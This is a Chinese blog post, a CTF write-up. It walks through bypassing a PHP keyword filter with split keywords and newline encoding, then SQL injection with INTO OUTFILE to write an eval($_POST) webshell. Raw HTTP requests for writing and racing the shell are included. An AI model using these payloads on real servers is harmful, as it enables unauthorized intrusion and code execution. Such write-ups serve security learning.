@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>一道题目小记 | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="实验班小伙伴出了一道题，每一步都有坑，很有趣。 先是一个登陆窗口，在/index.php中输入用户名密码，会把语句返回出来。TIP放出过滤的源码： 123456789101112131415161718192021222324&amp;lt;?phpfunction filter($input)&amp;#123;    while(preg_match(&apos;/(and|or|union|where|limit|g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道题目小记">
+<meta property="og:url" content="http://hebic.me/2017/10/07/一道题目writeup/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="实验班小伙伴出了一道题，每一步都有坑，很有趣。 先是一个登陆窗口，在/index.php中输入用户名密码，会把语句返回出来。TIP放出过滤的源码： 123456789101112131415161718192021222324&amp;lt;?phpfunction filter($input)&amp;#123;    while(preg_match(&apos;/(and|or|union|where|limit|g">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://hebic.me/2017/10/07/一道题目writeup/1.png">
+<meta property="og:updated_time" content="2017-10-07T07:54:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一道题目小记">
+<meta name="twitter:description" content="实验班小伙伴出了一道题，每一步都有坑，很有趣。 先是一个登陆窗口，在/index.php中输入用户名密码，会把语句返回出来。TIP放出过滤的源码： 123456789101112131415161718192021222324&amp;lt;?phpfunction filter($input)&amp;#123;    while(preg_match(&apos;/(and|or|union|where|limit|g">
+<meta name="twitter:image" content="http://hebic.me/2017/10/07/一道题目writeup/1.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-一道题目writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">一道题目小记</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.10.07</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/10/07/一道题目writeup/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>实验班小伙伴出了一道题，每一步都有坑，很有趣。</p>
+<p>先是一个登陆窗口，在/index.php中输入用户名密码，会把语句返回出来。TIP放出过滤的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(preg_match(<span class="string">'/(and|or|union|where|limit|group by|select|hex|substr)/i'</span>,$input))&#123;</span><br><span class="line">        $input=preg_replace(<span class="string">'/(and|or|union|where|limit|group by|select|hex|substr)/i'</span>,<span class="string">''</span>,$input);</span><br><span class="line">    &#125;</span><br><span class="line">    $array=<span class="keyword">array</span>(<span class="string">"*"</span>,<span class="string">" "</span>,<span class="string">"-"</span>,<span class="string">"0x"</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($array <span class="keyword">as</span> $str)&#123;</span><br><span class="line">        $input=str_replace($str,<span class="string">""</span>,$input);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_add</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">    $filter=preg_match(<span class="string">'/(select.*into outfile)|(limit [0-9]+,[0-9]+)/i'</span>,$input);</span><br><span class="line">    <span class="keyword">if</span>($filter)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert(\"emmmm...want to have a webshell?.\")&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_admin</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">    preg_match(<span class="string">"/^[_0-9a-z]&#123;4,25&#125;$/i"</span>,$input) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert(\"Emmmmm...Your input is out of range or containing illegal parameter.\")&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了select和where，没有多语句，没啥办法。经过小伙伴指点，发现过滤分为两次，所以用sel-ect就可以绕过了，空格用%0a。union或者报错都可以得到管理员账号密码，登陆后得到flag的第一部分。</p>
+<p><img src="/2017/10/07/一道题目writeup/1.png" alt=""></p>
+<p>flag的第二部分要求用mysql写shell，写shell可以用into outfile，或者多语句先修改log的位置，再写入shell，这道题用into outfile。.*用%0a绕过。写入之后提示your shell is detected。题目没有php的waf，而且有时候第一次访问可以访问，第二次就失败了，猜测是有其他waf在遍历文件。这种的用竞争在被删除内容之前访问就可以。本以为这题就这么做出来了，发现传上去的&lt;?php system(‘ls’);?&gt;变成了&lt;?/php system(‘ls’);?&gt;，导致php无法解析，这里我想到的方法是把&lt;?php放到第一个注入点，两个注入点中间会自动形成一个空格，这样shell就可以用了。</p>
+<p>由于burpsuite的intruder没法写shell和访问shell两个同时跑，就一个从1-1000.php的写入，一个10000-1.php访问，中间汇合的时候总可以访问到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 222.18.158.233:2003</span><br><span class="line">User-Agent: Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.3 (KHTML, like Gecko) Version/10.0 Mobile/14G5037b Safari/602.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">Referer: http://222.18.158.233:2003/</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">uname=-1&apos;%0aUn-ion%0ase-lect%0a&apos;&lt;?php&apos;,&apos;eval(&quot;$_POST[1]&quot;);&apos;%0ainto%0aoutfile%0a&apos;/var/www/html/h§7§.php&apos;#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /h§7§.php HTTP/1.1</span><br><span class="line">Host: 222.18.158.233:2003</span><br><span class="line">User-Agent: Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.3 (KHTML, like Gecko) Version/10.0 Mobile/14G5037b Safari/602.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p>最后flag在 ../flag.txt中，cat出来即可。</p>
+<p>问出题人得知自己是非预期解。waf在check时不允许php最后有分号，为了防止删除php，只需要不要在语句结束后加分号。另外&lt;?php后面空格的绕过，要用\n。</p>
+<p>做了大半天，每次都被虐，这种不怎么超出能力还不一下子能想出来的题做起来最爽了。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/09/26/ctf之命令执行小总结/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/10/14/web15天极客All-kill指南/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/10/07/一道题目writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
